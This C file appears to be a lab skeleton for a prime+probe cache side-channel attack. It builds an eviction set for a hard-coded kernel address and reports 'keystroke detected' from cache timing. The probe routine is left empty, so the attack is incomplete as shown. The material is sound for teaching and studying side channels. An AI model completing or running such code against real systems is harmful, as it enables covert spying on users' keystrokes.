#include "../lib/eviction.h"
#include "../lib/utils.h"
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define WAIT_CYCLES 20000
#define MAX_ASSOC 16

void handle_sigint(int sig) { exit(0); }

void probe(EvictionSet *es, NumList *nl) {}

int main(void) {
  signal(SIGINT, handle_sigint);
  uint64_t target_addr = 0xffffffff8fc91050;
  CacheLineSet *cl_set = new_cl_set();

  uint64_t threshold = detect_flush_reload_threshold();
  if (!get_minimal_set((uint8_t *)target_addr, &cl_set, threshold)) {
    printf("Error. Failed to generate minimal eviction set.\n");
  }

  EvictionSet *es = new_eviction_set(cl_set);
  while (1) {
    access_set(es); // prime
    uint64_t t = rdtsc_begin();
    while (rdtsc_end() - t < WAIT_CYCLES)
      sched_yield();

    NumList *timings = new_num_list(MAX_ASSOC);
    probe(es, timings);
    if (max(timings) > threshold) {
      printf("keystroke detected\n");
    }
    usleep(150000); // sleep for 150 ms
  }

  deep_free_cl_set(cl_set);
}
